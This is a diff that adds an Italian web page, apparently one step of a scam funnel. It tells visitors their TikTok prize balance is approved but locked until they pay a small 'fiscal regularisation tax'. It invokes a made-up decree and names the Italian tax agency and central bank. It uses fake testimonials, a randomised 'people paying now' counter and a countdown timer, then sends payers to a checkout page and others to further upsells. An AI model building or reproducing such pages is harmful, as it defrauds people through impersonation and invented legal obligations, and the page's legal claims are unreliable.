@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Regolarizzazione Fiscale – TikTok Premi</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+:root{--primary:hsl(346,97%,55%);--bg:#f5f5f7;--card:#fff;--fg:#111;--muted:#6b7280;--border:#e5e7eb;--green:#00b37e;--amber:#f59e0b}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-height:100vh;display:flex;flex-direction:column;align-items:center;-webkit-font-smoothing:antialiased}
+@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse-ring{0%{box-shadow:0 0 0 0 hsl(346 97% 55%/.4)}70%{box-shadow:0 0 0 14px hsl(346 97% 55%/0)}100%{box-shadow:0 0 0 0 hsl(346 97% 55%/0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes tick{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+.fu{animation:fadeUp .4s ease both}
+.d1{animation-delay:.05s}.d2{animation-delay:.12s}.d3{animation-delay:.18s}.d4{animation-delay:.24s}.d5{animation-delay:.3s}.d6{animation-delay:.36s}.d7{animation-delay:.42s}.d8{animation-delay:.48s}
+
+/* Topbar urgência */
+.urgency-bar{width:100%;max-width:520px;background:#1c1c1e;color:#fff;text-align:center;padding:10px 16px;font-size:12px;font-weight:600;display:flex;align-items:center;justify-content:center;gap:8px}
+.urgency-dot{width:7px;height:7px;border-radius:50%;background:#ff4d67;animation:tick 1s ease infinite;flex-shrink:0}
+
+.wrap{width:100%;max-width:520px;padding:0 0 56px}
+
+/* Hero aprovação */
+.hero{background:linear-gradient(135deg,#0a0a0a,#1a1a2e);color:#fff;padding:28px 20px 24px;text-align:center}
+.hero-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(0,179,126,.15);border:1px solid rgba(0,179,126,.3);border-radius:99px;padding:5px 14px;font-size:11px;font-weight:700;color:#00b37e;text-transform:uppercase;letter-spacing:.06em;margin-bottom:16px}
+.hero-title{font-size:22px;font-weight:900;line-height:1.3;margin-bottom:8px}
+.hero-title span{color:#ff4d67}
+.hero-sub{font-size:13px;color:rgba(255,255,255,.65);line-height:1.6}
+.hero-amount{font-size:52px;font-weight:900;color:#fff;margin:16px 0 4px;font-variant-numeric:tabular-nums;letter-spacing:-1px}
+.hero-status{display:inline-flex;align-items:center;gap:6px;background:rgba(0,179,126,.12);border:1px solid rgba(0,179,126,.25);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;color:#00b37e;margin-bottom:0}
+
+/* Steps */
+.steps-wrap{padding:20px 16px 0}
+.steps-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);margin-bottom:12px}
+.steps{display:flex;flex-direction:column;gap:0}
+.step{display:flex;align-items:flex-start;gap:14px;padding:14px 0;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none}
+.step-num{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;flex-shrink:0}
+.step-num.done{background:var(--green);color:#fff}
+.step-num.active{background:var(--primary);color:#fff;animation:pulse-ring 2s ease infinite}
+.step-num.pend{background:var(--border);color:var(--muted)}
+.step-title{font-size:14px;font-weight:700;margin-bottom:2px}
+.step-desc{font-size:12px;color:var(--muted);line-height:1.45}
+.step-badge{display:inline-block;background:hsl(346 97% 55%/.1);color:var(--primary);font-size:10px;font-weight:700;border-radius:4px;padding:2px 7px;margin-top:4px}
+
+/* Card principal */
+.main-card{background:#fff;margin:16px 12px 0;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.07)}
+.card-header{background:linear-gradient(90deg,hsl(346,97%,55%),hsl(346,97%,42%));color:#fff;padding:16px 18px;display:flex;align-items:center;gap:12px}
+.card-header-ic{width:36px;height:36px;background:rgba(255,255,255,.2);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card-header h2{font-size:16px;font-weight:800}
+.card-header p{font-size:11px;opacity:.8;margin-top:2px}
+.card-body{padding:18px}
+
+/* Resumo valores */
+.value-rows{display:flex;flex-direction:column;gap:0;margin-bottom:16px;border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.value-row{display:flex;justify-content:space-between;align-items:center;padding:13px 16px;background:#fff}
+.value-row:not(:last-child){border-bottom:1px solid var(--border)}
+.value-row.highlight{background:hsl(346 97% 55%/.04)}
+.vr-label{font-size:13px;color:var(--muted);font-weight:500}
+.vr-label strong{color:var(--fg);font-weight:700}
+.vr-val{font-size:14px;font-weight:800;color:var(--fg);font-variant-numeric:tabular-nums}
+.vr-val.green{color:var(--green)}
+.vr-val.red{color:#e63946}
+
+/* Alerta fiscal */
+.fiscal-alert{background:hsl(38 92% 50%/.08);border:1px solid hsl(38 92% 50%/.25);border-radius:12px;padding:14px 16px;margin-bottom:16px;display:flex;gap:12px;align-items:flex-start}
+.fiscal-alert-ic{font-size:20px;flex-shrink:0;margin-top:1px}
+.fiscal-alert p{font-size:12.5px;color:#92400e;line-height:1.55;font-weight:500}
+.fiscal-alert strong{color:#78350f}
+
+/* Prova social */
+.social-wrap{margin-bottom:14px}
+.social-counter{text-align:center;font-size:12px;color:var(--muted);margin-bottom:10px;font-weight:600}
+.social-counter strong{color:var(--primary)}
+.testimonials{display:flex;flex-direction:column;gap:8px}
+.testi{background:#f9f9f9;border-radius:10px;padding:11px 13px;display:flex;align-items:flex-start;gap:10px}
+.testi-av{width:32px;height:32px;border-radius:50%;font-size:11px;font-weight:800;color:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.testi-name{font-size:12px;font-weight:700;color:var(--fg);margin-bottom:2px}
+.testi-text{font-size:11.5px;color:var(--muted);line-height:1.4;font-style:italic}
+.testi-check{font-size:11px;font-weight:700;color:var(--green);margin-top:3px}
+
+/* Timer */
+.timer-card{background:#fff4f6;border:1px solid #ffd6de;border-radius:12px;padding:12px 16px;margin-bottom:14px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.timer-label{font-size:12px;color:#9f1239;font-weight:600;line-height:1.3}
+.timer-count{font-size:22px;font-weight:900;color:#e63946;font-variant-numeric:tabular-nums;white-space:nowrap}
+
+/* CTA */
+.cta-wrap{padding:0 12px 12px}
+.btn-cta{display:flex;width:100%;padding:17px;background:var(--primary);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:800;font-family:'Poppins',sans-serif;cursor:pointer;align-items:center;justify-content:center;gap:10px;text-transform:uppercase;letter-spacing:.5px;box-shadow:0 12px 32px hsl(346 97% 55%/.3);animation:pulse-ring 2.5s ease infinite;transition:background .15s}
+.btn-cta:hover{background:hsl(346,97%,47%)}
+.btn-cta.loading{opacity:.75;pointer-events:none}
+.spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.btn-cta.loading .spinner{display:block}
+.skip-link{text-align:center;padding:10px 0 4px;font-size:12px;color:var(--muted)}
+.skip-link a{color:var(--muted);text-decoration:underline;cursor:pointer}
+.secure-badges{display:flex;justify-content:center;gap:16px;padding:8px 0 0;flex-wrap:wrap}
+.sbadge{font-size:11px;color:var(--muted);font-weight:600;display:flex;align-items:center;gap:4px}
+</style>
+</head>
+<body>
+
+<div class="urgency-bar fu d1">
+  <div class="urgency-dot"></div>
+  <span>⚠️ Regolarizzazione fiscale obbligatoria — saldo in attesa</span>
+</div>
+
+<div class="wrap">
+
+  <!-- Hero -->
+  <div class="hero fu d2">
+    <div class="hero-badge">✅ Saldo Approvato</div>
+    <h1 class="hero-title">Il tuo saldo è stato <span>approvato!</span><br>Manca solo un passaggio</h1>
+    <div class="hero-amount" id="heroAmount">€868,75</div>
+    <div class="hero-status">🔒 Approvato · In attesa di regolarizzazione fiscale</div>
+  </div>
+
+  <!-- Steps -->
+  <div class="steps-wrap fu d3">
+    <p class="steps-label">Situazione del tuo prelievo</p>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num done">✓</div>
+        <div>
+          <div class="step-title">Saldo approvato</div>
+          <div class="step-desc">Il tuo saldo di <strong id="stepTotal">€868,75</strong> è stato verificato e approvato.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num active">2</div>
+        <div>
+          <div class="step-title">Regolarizzazione fiscale obbligatoria</div>
+          <div class="step-desc">Richiesta dall'<strong>Agenzia delle Entrate</strong> e da <strong>Banca d'Italia</strong> per prelievi digitali.</div>
+          <span class="step-badge">Passaggio attuale</span>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num pend">3</div>
+        <div>
+          <div class="step-title">Ricevi via Satispay</div>
+          <div class="step-desc">Dopo la regolarizzazione, il saldo viene accreditato immediatamente.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Card principal -->
+  <div class="main-card fu d4">
+    <div class="card-header">
+      <div class="card-header-ic">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+      </div>
+      <div>
+        <h2>Imposta di Regolarizzazione</h2>
+        <p>Obbligatoria per legge — Decreto MEF 2024</p>
+      </div>
+    </div>
+    <div class="card-body">
+
+      <div class="value-rows fu d5">
+        <div class="value-row">
+          <span class="vr-label">Saldo accumulato</span>
+          <span class="vr-val green" id="valTotal">€868,75</span>
+        </div>
+        <div class="value-row">
+          <span class="vr-label"><strong>Imposta regolarizzazione</strong><br><small style="font-size:10px;color:#9ca3af;font-weight:400">Ritenuta fiscale digitale — Art. 26 DPR 600/73</small></span>
+          <span class="vr-val red" id="valImposta">€23,40</span>
+        </div>
+        <div class="value-row highlight">
+          <span class="vr-label"><strong>Totale che ricevi</strong></span>
+          <span class="vr-val green" id="valRecevi">€868,75</span>
+        </div>
+      </div>
+
+      <div class="fiscal-alert fu d5">
+        <span class="fiscal-alert-ic">⚠️</span>
+        <p>Secondo il <strong>Decreto MEF n.°142/2024</strong>, tutti i prelievi da piattaforme digitali superiori a €500 richiedono il pagamento anticipato della ritenuta fiscale. L'importo è interamente detraibile nella dichiarazione dei redditi.</p>
+      </div>
+
+      <!-- Prova social -->
+      <div class="social-wrap fu d6">
+        <p class="social-counter"><strong id="counterNum">41</strong> persone stanno regolarizzando in questo momento</p>
+        <div class="testimonials">
+          <div class="testi">
+            <div class="testi-av" style="background:#e05252">CM</div>
+            <div>
+              <div class="testi-name">Carla M. — Milano</div>
+              <div class="testi-text">"Ho pagato l'imposta e in 3 minuti avevo i soldi sul conto. Facilissimo!"</div>
+              <div class="testi-check">✅ Saldo ricevuto</div>
+            </div>
+          </div>
+          <div class="testi">
+            <div class="testi-av" style="background:#00b37e">RL</div>
+            <div>
+              <div class="testi-name">Raffaele L. — Roma</div>
+              <div class="testi-text">"Pensavo fosse complicato ma è stato immediato. Ora aspetto il secondo prelievo!"</div>
+              <div class="testi-check">✅ Saldo ricevuto</div>
+            </div>
+          </div>
+          <div class="testi">
+            <div class="testi-av" style="background:#8b5cf6">GO</div>
+            <div>
+              <div class="testi-name">Gioia O. — Napoli</div>
+              <div class="testi-text">"Tutto ok, procedura chiara. L'imposta vale la pena per sbloccare il saldo!"</div>
+              <div class="testi-check">✅ Saldo ricevuto</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Timer -->
+      <div class="timer-card fu d7">
+        <span class="timer-label">⏰ Saldo riservato per te ancora per</span>
+        <span class="timer-count" id="timerCount">14:59</span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- CTA -->
+  <div class="cta-wrap fu d8" style="margin-top:14px">
+    <button class="btn-cta" id="btnCta">
+      <div class="spinner"></div>
+      <span class="btn-text">🔒 Paga l'Imposta e Ricevi il Saldo</span>
+    </button>
+    <div class="secure-badges">
+      <span class="sbadge">🔒 SSL 256-bit</span>
+      <span class="sbadge">✅ Satispay</span>
+      <span class="sbadge">🏛️ Agenzia Entrate</span>
+    </div>
+    <div class="skip-link"><a id="skipLink">Non voglio ricevere il mio saldo →</a></div>
+  </div>
+
+</div>
+
+<script>
+(function(){
+  var params  = new URLSearchParams(window.location.search);
+  var total   = parseFloat(params.get('total')) || 868.75;
+  var imposta = 23.40;
+  function fmt(v){ return '€' + v.toFixed(2).replace('.',','); }
+
+  document.getElementById('heroAmount').textContent  = fmt(total);
+  document.getElementById('stepTotal').textContent   = fmt(total);
+  document.getElementById('valTotal').textContent    = fmt(total);
+  document.getElementById('valImposta').textContent  = fmt(imposta);
+  document.getElementById('valRecevi').textContent   = fmt(total);
+
+  // Counter flutuante
+  var base = 38 + Math.floor(Math.random()*8);
+  document.getElementById('counterNum').textContent = base;
+  setInterval(function(){
+    var delta = Math.random() < .5 ? -1 : 1;
+    base = Math.max(28, Math.min(55, base + delta));
+    document.getElementById('counterNum').textContent = base;
+  }, 4200);
+
+  // Timer 15 min
+  var secs = 15*60 - 1;
+  var timerEl = document.getElementById('timerCount');
+  var timerInt = setInterval(function(){
+    if(secs <= 0){ clearInterval(timerInt); timerEl.textContent = '00:00'; return; }
+    var m = Math.floor(secs/60), s = secs%60;
+    timerEl.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+    secs--;
+  }, 1000);
+
+  // CTA
+  document.getElementById('btnCta').addEventListener('click', function(){
+    var btn = this;
+    btn.classList.add('loading');
+    btn.querySelector('.btn-text').textContent = 'Generazione pagamento…';
+    setTimeout(function(){
+      var dest = new URL('checkout-buck.html', window.location.href);
+      params.forEach(function(v,k){ dest.searchParams.set(k,v); });
+      dest.searchParams.set('taxa', imposta.toFixed(2));
+      dest.searchParams.set('total', total.toFixed(2));
+      window.location.href = dest.toString();
+    }, 900);
+  });
+
+  // Skip → próximo upsell ou fim
+  document.getElementById('skipLink').addEventListener('click', function(){
+    var dest = new URL('up2.html', window.location.href);
+    params.forEach(function(v,k){ dest.searchParams.set(k,v); });
+    window.location.href = dest.toString();
+  });
+})();
+</script>
+</body>
+</html>
